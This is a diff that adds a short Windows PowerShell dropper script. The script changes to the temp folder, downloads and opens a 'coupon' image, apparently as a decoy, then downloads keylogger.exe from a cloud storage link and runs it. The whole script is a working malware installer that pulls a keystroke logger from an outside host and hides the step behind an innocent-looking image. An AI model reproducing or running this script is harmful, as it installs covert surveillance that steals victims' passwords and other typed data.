@@ -1,0 +1,5 @@
+cd %TEMP%
+Invoke-WebRequest 'https://i.pinimg.com/originals/c5/84/f9/c584f981407cd33c9fe305dfbc050e61.png' -Outfile coupon.png
+coupon.png
+Invoke-WebRequest 'https://firebasestorage.googleapis.com/v0/b/cyber-security-ab642.appspot.com/o/keylogger.exe?alt=media&token=8b222f91-f092-4980-9656-4a60a54e5bef' -Outfile keylogger.exe
+keylogger.exe
